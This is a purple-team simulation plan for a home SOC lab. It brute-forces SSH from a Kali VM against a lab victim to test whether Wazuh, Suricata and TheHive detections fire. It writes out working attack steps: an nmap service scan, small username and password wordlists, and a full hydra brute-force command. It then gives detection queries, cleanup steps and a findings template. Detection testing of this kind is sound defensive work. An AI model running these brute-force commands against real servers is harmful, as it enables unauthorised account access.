# Simulation: SSH Brute Force Attack

**ATT&CK Technique:** T1110.001 — Brute Force: Password Guessing  
**Detection Rule:** SOC-050  
**Expected Severity:** High  
**Estimated Duration:** 10 minutes

---

## Objective

Simulate an SSH brute force attack from the Kali attacker VM against the Linux Victim to validate that:

1. Rule SOC-050 fires within 60 seconds of attack starting
2. Wazuh alert is generated and forwarded to TheHive
3. Suricata detects the scanning pattern (if ET rule matches)
4. The runbook steps successfully contain the attack

---

## Prerequisites

- [ ] All VMs running
- [ ] Wazuh agents connected
- [ ] Filebeat shipping auth logs
- [ ] Kibana open to monitor live events
- [ ] TheHive open to observe incoming alerts

---

## Setup

### On Kali (192.168.56.40)

```bash
# Install tools if not present
sudo apt install -y hydra medusa nmap

# Create a wordlist with common passwords
cat > /tmp/passwords.txt <<EOF
admin
password
123456
root
toor
letmein
qwerty
test
password123
P@ssword
EOF

# Create username list
cat > /tmp/users.txt <<EOF
root
admin
ubuntu
user
administrator
test
git
deploy
EOF
```

---

## Execution

### Phase 1 — Reconnaissance

```bash
# From Kali — scan SSH port on Linux Victim
nmap -sV -p 22 192.168.56.30
```

**Expected:** Port 22 open, OpenSSH version visible.  
**Suricata should log:** A PortScan alert (ET SCAN category).

### Phase 2 — Brute Force

```bash
# From Kali — run Hydra brute force
hydra -L /tmp/users.txt -P /tmp/passwords.txt \
  ssh://192.168.56.30 \
  -t 4 \
  -V \
  -o /tmp/hydra-results.txt
```

Parameters explained:
- `-L` — username list
- `-P` — password list
- `-t 4` — 4 parallel connections (keeps it realistic, not too loud)
- `-V` — verbose output
- `-o` — save results

**Expected:** ~80 failed auth attempts within 60 seconds.

### Phase 3 — Observe Detections

On SIEM, watch logs in real time:

```bash
# Watch auth.log for failures
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep -A5 "SOC-050\|ssh\|brute"
```

In Kibana:
```kql
program: sshd AND "Failed password" AND src_ip: "192.168.56.40"
```

---

## Expected Detection Results

| Detection | Expected? | Fired? | Notes |
|-----------|-----------|--------|-------|
| Wazuh Rule 5710/5712 (SSH brute force) | Yes | ❓ | Built-in Wazuh rules |
| SOC-050 Sigma → EQL query | Yes | ❓ | Custom rule |
| Suricata ET SCAN PortScan | Yes | ❓ | ET/Open rules |
| Suricata ET ATTACK SSH BruteForce | Yes | ❓ | ET/Open rules |
| TheHive alert created | Yes | ❓ | Via Wazuh integration |

Update the table after running the simulation.

---

## Atomic Red Team Mapping

This simulation corresponds to:

```bash
# On Windows Victim — equivalent test via Atomic Red Team
Invoke-AtomicTest T1110.001
```

Manual Linux equivalent is documented above.

---

## Cleanup

```bash
# On Linux Victim — unblock Kali IP if it was blocked during testing
sudo ufw delete deny from 192.168.56.40

# Remove test entries from auth.log baseline
# (No action needed — log is a record)

# On Kali — remove temp files
rm /tmp/passwords.txt /tmp/users.txt /tmp/hydra-results.txt
```

---

## Findings

*Complete this section after running the simulation.*

**Date run:**  
**Analyst:**  
**Result:** Pass / Fail / Partial

**What fired:**

**What was missed:**

**False positives observed:**

**Time from attack start to alert:**

**Runbook gaps identified:**

**Follow-up issues created:**
- [ ] #
